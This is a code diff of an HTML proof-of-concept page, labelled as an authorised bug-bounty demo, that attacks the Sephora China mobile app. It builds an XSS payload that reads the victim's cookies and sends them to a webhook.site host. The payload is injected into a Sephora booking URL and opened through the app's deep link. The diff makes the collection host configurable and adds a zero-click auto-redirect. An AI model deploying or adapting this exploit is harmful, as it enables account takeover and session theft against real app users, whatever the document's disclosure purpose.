@@ -40,20 +40,22 @@ h1{font-size:26px;margin:0 0 6px;letter-spacing:2px;color:#fff}
 <div class="warn">
   ⚠️ 授权安全测试演示页 (SRC PoC)<br>
   点击后拉起丝芙兰 APP 并演示账号接管链<br>
-  全程零 frida · 零工具 · 仅需正常点击
+  全程零 frida · 零工具 · 零点击(自动跳转)
 </div>
 
 <script>
-// ★ 一键 PoC: XSS payload 读 cookie → 出网到 webhook.site
-var WEBHOOK = "b9f18d75-0f59-46d7-a472-60d7e829ad3f";
+// ★ WEBHOOK 可替换: URL 加 ?webhook=<uuid> 或 ?webhook=<完整接收URL>
+//   示例: sephora-guide.html?webhook=12345678-xxxx       → https://<uuid>.webhook.site/ato
+//         sephora-guide.html?webhook=https://x.com/collect → 原样使用
+//   不带参数则用下方默认值
+var _wp = new URLSearchParams(location.search).get('webhook');
+var WEBHOOK = !_wp ? 'https://b9f18d75-0f59-46d7-a472-60d7e829ad3f.webhook.site/ato'
+  : (_wp.indexOf('http') === 0 ? _wp : 'https://' + _wp + '.webhook.site/ato');
 
-var n = 5;
-var cdTimer = setInterval(function() {
-  n--;
-  var el = document.getElementById('cd');
-  if (el) el.textContent = n;
-  if (n <= 0) { clearInterval(cdTimer); start(); }
-}, 1000);
+function buildPayload() {
+  return "<img src=x onerror=\"new Image().src='" + WEBHOOK +
+    "?c='+encodeURIComponent(location.origin+'|||'+document.cookie.substring(0,500))\">";
+}
 
 var started = false;
 function start() {
@@ -61,13 +63,9 @@ function start() {
   var st = document.getElementById('st');
   st.textContent = "⚡ 正在拉起丝芙兰 APP…";
 
-  var payload = "<img src=x onerror=\"new Image().src='https://" + WEBHOOK +
-    ".webhook.site/ato?c='+encodeURIComponent(location.origin+'|||'+document.cookie.substring(0,500))\">";
   var xssUrl = "https://wx.sephora.cn/m/booking.html#/vicMsg?type=3&msg=" +
-    encodeURIComponent(payload);
-  var dl = "sephora://openurl?url=" + encodeURIComponent(xssUrl);
-
-  location.href = dl;
+    encodeURIComponent(buildPayload());
+  location.href = "sephora://openurl?url=" + encodeURIComponent(xssUrl);
   setTimeout(function() {
     if (!document.hidden) {
       st.textContent = "↗️ 尝试 intent:// 回退…";
@@ -75,8 +73,17 @@ function start() {
         "#Intent;scheme=sephora;package=com.arvato.sephora.app;end;";
     }
   }, 1500);
-  setTimeout(function(){ st.textContent = "✅ 请查看 webhook.site 收证页面"; }, 4000);
+  setTimeout(function(){ st.textContent = "✅ 请查看 webhook 收证页面"; }, 4000);
 }
+
+// 倒计时自动跳转
+var n = 5;
+var cdTimer = setInterval(function() {
+  n--;
+  var el = document.getElementById('cd');
+  if (el) el.textContent = n;
+  if (n <= 0) { clearInterval(cdTimer); start(); }
+}, 1000);
 </script>
 </body>
 </html>
